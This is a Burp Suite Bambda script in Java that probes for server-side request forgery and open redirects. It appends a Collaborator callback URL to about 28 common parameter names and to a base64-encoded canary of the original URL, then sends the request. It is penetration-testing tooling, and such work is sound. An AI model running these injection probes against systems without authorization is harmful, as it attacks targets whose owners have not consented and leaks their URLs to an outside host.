/**
 * This Bambda constructs and sends a GET request with various parameters.
 * Each parameter is appended with the collaborator URL.
 * The 'base64url' parameter contains a base64-encoded version of the original request URL.
 * 
 * @author Eric Labrador Sainz (https://github.com/e1abrador)
 */

String collaboratorUrl = "https://xyz.oastify.com/";

try {
    // Base64 encode the original request URL
    String encodedUrl = java.util.Base64.getEncoder().encodeToString(requestResponse.request().url().getBytes());

    // Construct the canary URL using the collaborator URL and the encoded original URL
    String canary = collaboratorUrl + encodedUrl;

    // Start building the test URL with the original request URL
    StringBuilder testURLBuilder = new StringBuilder(requestResponse.request().url());

    // Add a '?' or '&' based on whether the original URL already contains query parameters
    if (!testURLBuilder.toString().contains("?")) {
        testURLBuilder.append("?");
    } else {
        testURLBuilder.append("&");
    }

    // Add the 'base64url' parameter with the canary
    testURLBuilder.append("base64url=").append(canary);

    // Additional parameters to append
    String[] paramsToAdd = {"dest", "redirect", "uri", "path", "continue", "url", "window", "next", "data",
                            "reference", "site", "html", "val", "validate", "domain", "callback", "return", 
                            "page", "feed", "host", "port", "to", "out", "view", "dir", "show", "navigation", 
                            "open"};

    // Append the additional parameters with the collaboratorUrl as their value
    for (String param : paramsToAdd) {
        testURLBuilder.append("&").append(param).append("=").append(collaboratorUrl);
    }

    // Convert the StringBuilder to a String and remove the trailing '&'
    String testURL = testURLBuilder.toString().replaceAll("&$", "");

    // Send request
    new java.net.URL(testURL).openStream();

} catch (Exception e) {
    System.out.println(e.getMessage());
}

return false;
